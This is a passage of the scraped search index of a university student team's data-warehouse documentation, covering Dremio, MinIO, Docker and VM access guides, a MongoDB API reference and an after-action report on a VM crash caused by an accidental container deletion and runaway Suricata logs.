","version":"Next","tagName":"h3"},{"title":"Elasticsearch​","type":1,"pageTitle":"Data Warehouse Administration","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Data Warehouse Overview#elasticsearch","content":" Elasticsearch is the storage and querying tool for logs and has its own external volume and the raw json storage can be accessed through the below ports.  See indexes: http://10.137.0.149:9200/_cat/indices?v  Query minio logs: http://10.137.0.149:9200/minio-*/_search?pretty/  Query file upload service logs: http://10.137.0.149:9200/upload-service-*/_search?pretty  ","version":"Next","tagName":"h3"},{"title":"Postgres​","type":1,"pageTitle":"Data Warehouse Administration","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Data Warehouse Overview#postgres","content":" Postgres is the provenance store and must be accessed after terminal ssh into the VM using this command:  docker exec -it postgres psql -U &lt;username&gt; -d &lt;database-name&gt;   ","version":"Next","tagName":"h3"},{"title":"Kibana​","type":1,"pageTitle":"Data Warehouse Administration","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Data Warehouse Overview#kibana","content":" Kibana is a tool for visualizing the logs stored in elasticsearch. Whilst it is connected to elasticsearch and operational, no dashboards have been created as of yet.  Kibana: http://10.137.0.149:5601 ","version":"Next","tagName":"h3"},{"title":"How to Use Dremio","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Dremio Guide","content":"","keywords":"","version":"Next"},{"title":"Why Dremio?​","type":1,"pageTitle":"How to Use Dremio","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Dremio Guide#why-dremio","content":" Dremio in the Data Warehouse is the GUI for table storage. It accesses data from the Data Warehouse sources of MinIO and Mongo DB.  Dremio was decided upon after a series of redback requirements gathering tasks where it was considered cost-effective (free) and would allow for storage from different data sources, with the SQL functionality and GUI making it a smaller learning curve than other FOSS that were mostly terminal based.  ","version":"Next","tagName":"h2"},{"title":"How To Add A Source in Dremio​","type":1,"pageTitle":"How to Use Dremio","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Dremio Guide#how-to-add-a-source-in-dremio","content":" There are a few steps to adding a source in Dremio.  (For this example we will add a MinIO bucket as a source)  Add source  Use the 'Add source' button on the user interface  Enter Credentials  Enter Credentials according to the source.    Go to 'Advanced Options' and tick 'enable compatibility mode'    At this point, 'save' and the source should appear in the object storage list quickly.  ","version":"Next","tagName":"h3"},{"title":"Adding a Table in Dremio with SQL​","type":1,"pageTitle":"How to Use Dremio","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Dremio Guide#adding-a-table-in-dremio-with-sql","content":" Dremio allows for creating tables or 'views' with T-SQL. What this means is with the SQL language it's possible to modify the source data to a more meaningful state depending on the data analysis purpose.  Once a source has been added. Enter the SQL interface on the left side of the GUI. This will bring up a text box that SQL commands can be written in and executed from. Resulting in a modified table that can be accessed downstream.    Dremio also has the capability of storing files in Iceberg or Parquet format allowing for time-series versions of the same file and their metadata, which would aid in recording historical versions of the same files.  SQL Endpoint​  Alternatively, Dremio offers a SQL endpoint that through code you can query the source data through Dremio with SQL statements.  See the documentation of Dremio API also located in the Data warehouse documentation for a detailed explanation. ","version":"Next","tagName":"h3"},{"title":"GitHub and the Virtual Machine","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/GitHub","content":"Last updated by: RichardWhellum, Last updated on: '09/05/2025' Last updated by: RichardWhellum, Last updated on: '09/05/2025' GitHub and the Virtual Machine info Document Creation: 22 September, 2024. Last Edited: 29 April, 2025. Authors: kghdxx, Jesse Rees, nouri-devv. Document Code: ONB7. Effective Date: 22 September 2024. Expiry Date: 29 April 2026. It is important to clone the GitHub repository redback-data-warehouse to your working directory on the virtual machine. In order to push your changes and work to the GitHub repository it needs to be on the virtual machine not PC. There are vast resources for working in GitHub including resources in the Redback Teams channel. Here is a Redback video series that explains the steps to incorporate GitHub. You can also contact your mentor for further information. GitHub cloning and forking Video","keywords":"","version":"Next"},{"title":"How to Use MinIO","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/MinIO Guide","content":"","keywords":"","version":"Next"},{"title":"To access existing MinIO data​","type":1,"pageTitle":"How to Use MinIO","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/MinIO Guide#to-access-existing-minio-data","content":" Using the GUI  Accessing the MinIO object store through the GUI will first require entering the username and password. This is not included in this text for obvious security reasons but can be retrieved from the Data Warehouse mentor or current Data Warehouse leader.  Once authenticated the user will be presented with a MinIO object store user-interface.    As mentioned above MinIO stores files in 'buckets' to accommodate for different file types (flat, semi-structured and object).  There are already buckets that exist in the MinIO server on the virtual machine including 'dw-bronze-bucket' and 'dw-silver-bucket'. These are sources of the Redback File Upload System.  For the purposes of inspection following the MinIO address in browser will offer a GUI where navigation of buckets and files is possible as well as creation of credentials. This makes it easy to keep track of where files are being sent to and what path they can be accessed from as well as deleting and other admin tasks.  Using code  This is the most suitable way for data warehouse to utilise the MinIO object store.  Any code or file that needs to access files from MinIO or aims to upload files to MinIO requires an Access Key and Secret Key as mentioned above. It's recommended that these are stored in environment variables (.env file) and then excluded using a .gitignore file. Redback security policies won't allow for files with hardcoded credentials to be uploaded to GitHub.  An example code block to access a file from MinIO:  (referencing environment variables from a .env file)   get env () access_key = AWS_ACCESS_KEY secret_key = AWS_SECRET_KEY  ","version":"Next","tagName":"h3"},{"title":"How To Use The Data Warehouse - File Upload Service","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service","content":"","keywords":"","version":"Next"},{"title":"Part 1. Accessing the File Upload Service​","type":1,"pageTitle":"How To Use The Data Warehouse - File Upload Service","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service#part-1-accessing-the-file-upload-service","content":" Step 1 - Log into the Deakin VPN​  Because the 'File Upload Service' is running on a Deakin virtual machine you need to be authenticated via the VPN to access the port.  The link below contains a guide to a quick setup for the Deakin VPN  NOTE: you may need to 'log in' on the top right corner to access the VPN webpage​  Cisco AnyConnect – Deakin Software Library    Step 2 - Accessing the Streamlit app​  The File Upload Service is based on a streamlit app that is accessed through the browser.  Once the VPN is successfully set-up and if properly authenticated you can access the streamlit app that serves as the user interface for the service using the following addresshttp://10.137.0.149/    ","version":"Next","tagName":"h2"},{"title":"Using the File Upload Service​","type":1,"pageTitle":"How To Use The Data Warehouse - File Upload Service","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service#using-the-file-upload-service","content":" ","version":"Next","tagName":"h2"},{"title":"Upload Options​","type":1,"pageTitle":"How To Use The Data Warehouse - File Upload Service","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service#upload-options","content":" There are a number of options to modify the way you can store data in the FUS  Project Selection​  chose the appropriate redback operations project  Choose a File​  Use the drag and drop function or browse files to select the relevant file. Only .csv files will be accepted for pre-processing options.  Preprocessing​  Choose a pre-processing option if desired. Explained further below.  Add Prefix and Suffix to Filename​  The check-box if ticked will add a Project Prefix and a timestamp to the end of the csv stored in the VM's filename. This is recommended as it helps with data governance.  By not unticking the checkbox the filename will enter storage as the base name entered below. This will remove the timestamp and allow for overwriting the file if it is modified by performing the file upload again with the same name.  Entering the Filename​  Enter the name of the file it will only accept alphanumeric values.  Clicking the 'Upload to Data Warehouse' button will produce a summary and confirm or reject the file.  ","version":"Next","tagName":"h3"},{"title":"pre-processing​","type":1,"pageTitle":"How To Use The Data Warehouse - File Upload Service","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service#pre-processing","content":" what is each preprocessing actually doing  Data Clean Up Preprocessing  The Data Clean Up option performs basic formatting and data cleansing for data that is intended for general use. The code focuses on cleaning the dataset by removing irrelevant or potentially problematic data (empty columns, duplicate rows etc.), before standardizing columns for consistency and adding metadata with an extract date and unique ID columns.  Preprocessing for Machine Learning  The Machine Learning option intends to prepare data in a way that will optomise it for machine learning tasks downstream by transforming numeric data for ML algorithms by handling missing values and scaling features as well as ensuring that numeric features are on a comparable scale, which is a common pre-processing step in data science and analysis tasks.  ","version":"Next","tagName":"h2"},{"title":"Step 3 - Uploading a file​","type":1,"pageTitle":"How To Use The Data Warehouse - File Upload Service","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service#step-3---uploading-a-file","content":" Using the drop-down box select the project of which the data is related to.  (This decides the directory in the VM and the MinIO bucket that the data will be stored in and how it will be able to be accessed once it is stored.)  The FUS will ask for a file name and enforce some naming conventions. Please make the name descriptive but brief.  If successful, the website will show 'Uploaded Successfully'.    ","version":"Next","tagName":"h2"},{"title":"Part 2 - Retrieving a File​","type":1,"pageTitle":"How To Use The Data Warehouse - File Upload Service","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service#part-2---retrieving-a-file","content":" There are a few options to retrieve/download a file from the VM using the file upload service.  ","version":"Next","tagName":"h2"},{"title":"Option A - Retrieving the file with code​","type":1,"pageTitle":"How To Use The Data Warehouse - File Upload Service","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service#option-a---retrieving-the-file-with-code","content":" To access the file through an IDE you can access the list of files with the Flask API to do this use the following code.  Downloading from web browser:http://http//10.137.0.149/:5000/download-file?bucket=dw-bucket-bronze&amp;filename=project3/testdocument_20240921.csv  Using a variation of the address above will download a file through the browser.  Using Curl in Command Line​  Open a terminal or command prompt and use a variation of the code below to download the file.  curl -o file.txt &quot;http://localhost:5000/download-file?bucket=dw-bucket-bronze&amp;filename=project1/data/file.txt&quot;  Using requests Package in an IDE​  Using the Requests package will access the data through the Flask API.  import requests url = &quot;http://&lt;server_address&gt;:5000/download-file&quot; params = { 'bucket': '&lt;bucket_name&gt;', 'filename': '&lt;file_path&gt;' } response = requests.get(url, params=params)   ","version":"Next","tagName":"h3"},{"title":"Option B - Download from browser​","type":1,"pageTitle":"How To Use The Data Warehouse - File Upload Service","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/How To Access The File Upload Service#option-b---download-from-browser","content":" Utilising the streamlit app interface for the file upload service provides several options to view and download previously uploaded files.  Perform the following steps to download a file from the browser.  Upon successfully uploading a file the following tabs can be used to download a file.  'View Original Files''View Pre-Processed Files'  Use the dropdown to select the appropriate project which will indicate the folder in which the file is in storageUse the 'Download Selected File from Bronze/Silver' Original files are stored in Bronze and Pre-processed in silverOnce download is initiated an API URL will appear and a second download button that can be used to execute the download.     ","version":"Next","tagName":"h3"},{"title":"Data Warehouse Next Steps","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Next Steps","content":"Last updated by: RichardWhellum, Last updated on: '09/05/2025' Last updated by: RichardWhellum, Last updated on: '09/05/2025' Data Warehouse Next Steps info Document Creation: 22 September, 2024. Last Edited: 29 April, 2025. Authors: kghdxx, Jesse Rees, nouri-devv. Document Code: ONB8. Effective Date: 22 September 2024. Expiry Date: 29 April 2026. The Data Warehouse has come a long way but there is still work to do. At the time of writing there are opportunities to: Implement the ability to bulk upload to the file upload service Refine and expand the pre-processing data in the file upload service to accommodate more dynamic transformations of different types of data/data types. Provide integration and orchestration designs to the existing data warehouse solutions Incorporate production data (not sample data) from Redback projects into the Data Warehouse solutions in a meaningful way.","keywords":"","version":"Next"},{"title":"Services not running in production","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Not in Prod","content":"","keywords":"","version":"Next"},{"title":"Nessie​","type":1,"pageTitle":"Services not running in production","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Not in Prod#nessie","content":" Nessie is a metadata store that captures information about the files in Dremio and keeps it in case of corruption or for historical analysis.  Because the Nessie file in Dremio has the details of each file it can work as a data catalog to quickly sort and find information in a data model which was the original intention to include it in the Data Warehouse stack.  The Data Warehouse VM is running a Nessie instance, and the proof of concept has been performed successfully using sample data in Dremio, however at the time of writing there is no Nessie files being stored or utilised in the Data Warehouse Dremio instance.  ","version":"Next","tagName":"h2"},{"title":"Spark Notebooks and the Virtual Machines​","type":1,"pageTitle":"Services not running in production","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Not in Prod#spark-notebooks-and-the-virtual-machines","content":" The Data Warehouse virtual machine is successfully running Apache Spark as part of the dockerfile.  By following the address: http://10.137.0.149:8888/ this will open a window and start a new Jupyter notebook.  This notebook exists and is running in the virtual machine where Spark jobs can be configured and ran. This represents a functionality to code and run distributed Spark jobs within the virtual machine and has the advantage of being able to process large datasets using the Spark DAG scheduler and partitioning data with distributed computing. At the time of writing without large production datasets in the VM there isn't currently a need for this functionality yet.   ","version":"Next","tagName":"h2"},{"title":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps","content":"","keywords":"","version":"Next"},{"title":"Summary​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#summary","content":" This document outlines the events, diagnosis, response, and lessons learned from a critical incident involving the Redback Data Warehouse (DW) VM, where all containers went down and the system became unresponsive due to a combination of user error and a rogue service (Suricata) flooding the disk.  This report serves both as documentation of leadership and technical response, and as a reference for future team members on how to handle similar VM-level issues.    ","version":"Next","tagName":"h2"},{"title":"Incident Overview​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#incident-overview","content":" Date of Incident: 15 April 2025VM Services Affected: All core DW services (MinIO, Dremio, File Upload Service, Postgres, etc.)Initial Trigger: Accidental execution of docker rm -f dremio minioserver followed by docker compose up -d by a teammateResult: Containers restarted incorrectly, data volumes not attached, and later VM became completely unresponsive due to full disk    ","version":"Next","tagName":"h2"},{"title":"Timeline & Root Cause Analysis​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#timeline--root-cause-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Phase 1: User Error​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#phase-1-user-error","content":" A teammate mistakenly believed they were working in an isolated environment and ran the following command: docker rm -f dremio minioserver docker compose up -d Unfortunately, the wrong Docker Compose file (from the Streamlit file upload app) was used, which does not map to the correct persistent volumes. As a result, the new containers started without links to the historical data — making it appear as if data had been lost.  ","version":"Next","tagName":"h3"},{"title":"Phase 2: Leadership Response​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#phase-2-leadership-response","content":" As the DW leader, I called my mentor Ben Stephens immediately, recognizing the severity of the incident.Ben advised checking whether volumes still existed — they did.We concluded that the data wasn't lost but rather the current containers weren’t mapped correctly.I attempted to locate and run the correct Docker Compose setup but couldn’t find the core DW folder.  ","version":"Next","tagName":"h3"},{"title":"Phase 3: Secondary Failure - Disk Full​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#phase-3-secondary-failure---disk-full","content":" While troubleshooting with Sumit (another team lead with data engineering experience), we found: docker compose up -d =&gt; Error: no space left on device VM disk usage was at 100%, preventing any container restarts. Ben later found the root cause: Suricata service had created 379GB of logs, overwhelming the system.  ","version":"Next","tagName":"h3"},{"title":"Phase 4: Mentor Resolution​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#phase-4-mentor-resolution","content":" Ben: Disabled Suricata using systemctlRemoved excess logs and files (including 2GB initially without success)Eventually recovered ~400GB of spaceConfirmed it was safe to bring the DW stack back online  ","version":"Next","tagName":"h3"},{"title":"Phase 5: My Recovery Actions​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#phase-5-my-recovery-actions","content":" I searched for the .env file required to run the core DW docker-compose.yml. Located it in the previous team leader’s directory. Once .env was in place, I ran: docker compose --env-file .env up -d All containers restarted successfully, data volumes were reattached, and DW was fully operational again.    ","version":"Next","tagName":"h3"},{"title":"Lessons Learned​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#lessons-learned","content":" ","version":"Next","tagName":"h2"},{"title":"Technical​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#technical","content":" Containers in Docker are not user-isolated by default. Running docker rm on shared containers can affect everyone. Volumes are persistent only if correctly mapped. Wrong compose file = containers without data. Disk usage alerts/log rotation for system services should be monitored — rogue services like Suricata can crash unrelated environments.  ","version":"Next","tagName":"h3"},{"title":"Team & Leadership​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#team--leadership","content":" Immediate escalation helped avoid damage.Involving experienced teammates (e.g., Sumit) accelerated recovery.Calm triage under pressure prevented further accidental damage.Mentor involvement at the right moment solved a system-level issue.    ","version":"Next","tagName":"h3"},{"title":"Recommendations​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#recommendations","content":" ","version":"Next","tagName":"h2"},{"title":"Technical Safeguards​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#technical-safeguards","content":" Use container labels/namespaces or Docker Compose project names to logically separate projects.Establish a read-only directory for critical compose files to prevent accidental edits or usage.Set up disk usage monitoring with alerts for system-wide usage &gt; 80%.  ","version":"Next","tagName":"h3"},{"title":"Training & Awareness​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#training--awareness","content":" Onboard all users with a clear understanding of: Shared nature of the VMWhich Docker Compose files to useWhere persistent volumes are declared and mounted Create a guide on &quot;How to safely run Docker containers in the DW VM&quot;  ","version":"Next","tagName":"h3"},{"title":"Preventive Measures​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#preventive-measures","content":" To proactively warn all users about the shared nature of the environment, a system-wide login message was added using the VM’s dynamic MOTD (Message of the Day) system. This banner appears every time a user logs in via SSH and highlights the risk of running destructive Docker commands like docker rm -f. This aims to prevent accidental container deletion and reinforces the importance of checking with the Data Warehouse leader before making changes.  Added a disclaimer to critical command guides like: DO NOT run `docker rm -f` on shared containers unless confirmed with mentor or DW lead.     ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"After-Action Report: Data Warehouse Crash and Recovery (April 2025)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Crash and next steps#conclusion","content":" This incident highlighted the importance of:  Good communicationTeam collaborationCalm leadershipTechnical clarity and documentation  Despite being outside my technical comfort zone, I led the response by:  Immediately escalating to our mentorBringing in experienced helpCoordinating a recovery planTaking ownership of getting DW back online  This documentation ensures that future leaders and contributors do not repeat the same mistakes and can follow a clear recovery path if a similar issue arises again.    Document prepared by Daezel Goyal, Data Warehouse Leader – Redback Operations, May 2025 ","version":"Next","tagName":"h2"},{"title":"The Virtual Machine (VM)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Guide","content":"","keywords":"","version":"Next"},{"title":"There are two recommended ways to access the virtual machine.​","type":1,"pageTitle":"The Virtual Machine (VM)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Guide#there-are-two-recommended-ways-to-access-the-virtual-machine","content":" ","version":"Next","tagName":"h2"},{"title":"Method 1. Using Command prompt.​","type":1,"pageTitle":"The Virtual Machine (VM)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Guide#method-1-using-command-prompt","content":" You can use command prompt to access the VM  Open command prompt from the start menuUse the command in the terminal ssh yourusername@redback.it.deakin.edu.auEnter your password.Use the terminal commands to navigate the VM  ","version":"Next","tagName":"h3"},{"title":"Method 2. Using VS Code IDE​","type":1,"pageTitle":"The Virtual Machine (VM)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Guide#method-2-using-vs-code-ide","content":" Using an IDE makes accessing and navigating the VM easier with the additional user interface instead of relaying code in CMD prompt.  Open VS codeClick on open remote in the bottom left corner open remote picture'+' add New SSH host...Enter 'redback.it.deakin.edu.au'Enter password for your VM userYou will see the redback ip in the bottom left-hand corner confirming your entry into the VMFrom here, it's recommended that you create your own folder to operate in the VM where you can then clone the data-warehouse GitHub repository and utilize the git functionality from the virtual machine as if it were an IDE on your PC. This is highly recommended and elaborated on later in the document.  ","version":"Next","tagName":"h3"},{"title":"Adding a new user to the Virtual Machine​","type":1,"pageTitle":"The Virtual Machine (VM)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Guide#adding-a-new-user-to-the-virtual-machine","content":" Adding a new user is a common occurrence and once you have sudo/admin privileges the process is straightforward.  Use the sudo adduser &lt;username&gt; Give the user a password Confirm details  Ensure to write down the credentials and send them through an appropriate means.    The user will now have access to the VM providing they follow the steps and authenticate through the VPN first as well.  ","version":"Next","tagName":"h3"},{"title":"List of Data Warehouse Addresses​","type":1,"pageTitle":"The Virtual Machine (VM)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Guide#list-of-data-warehouse-addresses","content":" Virtual Machine Address : 10.137.0.149​  File upload service (streamlit app):http://10.137.0.149:80/  MinIO: http://10.137.0.149:9001/login  Dremio: http://10.137.0.149:9047/  MongoDB: http://10.137.0.149:5003/documents  Spark Notebooks: http://10.137.0.149:8888/  Flask-API: http://10.137.0.149:5000/  *The virtual machine also shares some capacity with the cybersecurity team including ports and containers not covered here.  ","version":"Next","tagName":"h3"},{"title":"The VM and Docker​","type":1,"pageTitle":"The Virtual Machine (VM)","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/VM Guide#the-vm-and-docker","content":" ⚠️ WARNING: Changes made to the Docker containers inside the VM affect the shared production environment. These containers are NOT isolated per user.  The VM uses a Docker instance to run 'containers' or apps (different software we use as tools e.g. MongoDB).  This makes it easier to keep track of what's running on the virtual machine, the apps dependencies and how it is interacting with the other apps in the Docker environment.  Accessing the Docker instance and containers is done through a terminal.  The Docker commands are beneficial because they are in the context of the Docker environment/instance and the containers/apps within it making them easier to control and modify.  Here are some of the commonly used commands:  docker ps Show all the docker containers and their status in the VM.  docker up Restarts the containers in the Docker environment.  docker start Usually followed by the container ID or name of the app.  docker compose usually followed by the dockerfile that contains a list of containers.  To run the docker compose which starts the core infrastructure (everything besides mongo db) the command done in the &quot;Core DW Infrastructure&quot; directory is:  docker compose up -d  There is a lot of documentation freely available for using docker on a Linux VM for more detailed information.  Removing, stopping and restarting Docker​  It is important to note that stopping docker containers individually or as a collective will remove data associated with the container.  For instance, if I need to stop or restart the Dremio container and I have data within the Dremio container (SQL scripts, source information, usernames and admin information) this will remove this associated information unless there is a 'volume' consideration in the docker file. In the case of the core infrastructure there are volumes set up to capture information in the event of a restart or stop of the container.  Below is an extract from the docker-compose.yml. This serves as an example of using volumes to retain data.   (at the Dremio container code block) dremio: volumes: - fileuploadservice_dremio-data:/var/lib/dremio (at the 'volumes' code block) volumes: fileuploadservice_dremio-data: external: true  ","version":"Next","tagName":"h2"},{"title":"MongoDB Connection Server","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection","content":"","keywords":"","version":"Next"},{"title":"Prerequisites​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#prerequisites","content":" DockerDocker Compose  ","version":"Next","tagName":"h2"},{"title":"Setup​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#setup","content":" ","version":"Next","tagName":"h2"},{"title":"1. Clone the Repository​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#1-clone-the-repository","content":" git clone https://github.com/Redback-Operations/redback-data-warehouse.git cd &quot;MongoDB Connection/Project1&quot;   ","version":"Next","tagName":"h3"},{"title":"2. Create .env at your root directory​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#2-create-env-at-your-root-directory","content":" MONGO_URI=&quot;mongodb://your_username:your_password@your_host:your_port/?authSource=your_authSource&quot;DB_NAME=&quot;your_database_name&quot;COLLECTION_NAME=&quot;your_collection_name&quot;  ","version":"Next","tagName":"h3"},{"title":"3. Run Docker Compose to build the images and run the services:​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#3-run-docker-compose-to-build-the-images-and-run-the-services","content":" - docker-compose up --build   ","version":"Next","tagName":"h3"},{"title":"4. View the Application​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#4-view-the-application","content":" Open your browser and navigate to http://localhost:5003/  ","version":"Next","tagName":"h3"},{"title":"Configuring MongoDB and Monitoring Logs​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#configuring-mongodb-and-monitoring-logs","content":" ","version":"Next","tagName":"h2"},{"title":"Changing MongoDB Documents and Collections as needed​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#changing-mongodb-documents-and-collections-as-needed","content":" config.py contains the MongoDB connection string.document_model.py contains the MongoDB collection name.  ","version":"Next","tagName":"h3"},{"title":"Check logs application​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#check-logs-application","content":" All the logs are stored in the logs folder at the root of the project.(app.log)  ","version":"Next","tagName":"h3"},{"title":"API Endpoints​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#api-endpoints","content":" ","version":"Next","tagName":"h2"},{"title":"1. Get All Documents​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#1-get-all-documents","content":" Endpoint: /documentsMethod: GETDescription: Retrieves all documents from the database.Response: 200 OK: Returns a JSON array of documents.  ","version":"Next","tagName":"h3"},{"title":"2. Get Document by ID​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#2-get-document-by-id","content":" Endpoint: /documents/&lt;document_id&gt;Method: GETDescription: Retrieves a document by its ID.Parameters: document_id (path): The ID of the document to retrieve. Response: 200 OK: Returns the document as a JSON object.404 Not Found: If the document is not found.  ","version":"Next","tagName":"h3"},{"title":"3. Insert Document​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#3-insert-document","content":" Endpoint: /documentsMethod: POSTDescription: Inserts a new document into the database.Request Body: JSON object representing the document to insert.Response: 201 Created: Returns a success message and the ID of the inserted document.  ","version":"Next","tagName":"h3"},{"title":"4. Update Document​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#4-update-document","content":" Endpoint: /documents/&lt;document_id&gt;Method: PUTDescription: Updates an existing document by its ID.Parameters: document_id (path): The ID of the document to update. Request Body: JSON object representing the updated document data.Response: 200 OK: Returns a success message if the document was updated.404 Not Found: If the document is not found or no changes were made.  ","version":"Next","tagName":"h3"},{"title":"5. Delete Document​","type":1,"pageTitle":"MongoDB Connection Server","url":"/redback-documentation/docs/data-warehousing/MongoDb Connection/mongodbconnection#5-delete-document","content":" Endpoint: /documents/&lt;document_id&gt;Method: DELETEDescription: Deletes a document by its ID.Parameters: document_id (path): The ID of the document to delete. Response: 200 OK: Returns a success message if the document was deleted.404 Not Found: If the document is not found. ","version":"Next","tagName":"h3"},{"title":"Mosquitto MQTT Broker","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#overview","content":" This document outlines the configuration, usage, and operational practices for the Mosquitto MQTT Broker deployed on the Data Warehouse Ubuntu VM (10.137.0.149).  Eclipse Mosquitto is a lightweight, open-source MQTT (Message Queuing Telemetry Transport) broker optimised for minimal network usage and ideal for IoT or lightweight messaging systems. It supports MQTT versions 3.1, 3.1.1, and 5.0.    ","version":"Next","tagName":"h2"},{"title":"System Details​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#system-details","content":" Setting\tValueHost OS\tUbuntu Broker IP\t10.137.0.149 Port\t1883 (unencrypted, default) Persistence\tEnabled Logging\t/var/log/mosquitto/mosquitto.log Anonymous Access\tEnabled (no restrictions configured) TLS/Authentication\tNot configured    ","version":"Next","tagName":"h2"},{"title":"Installation 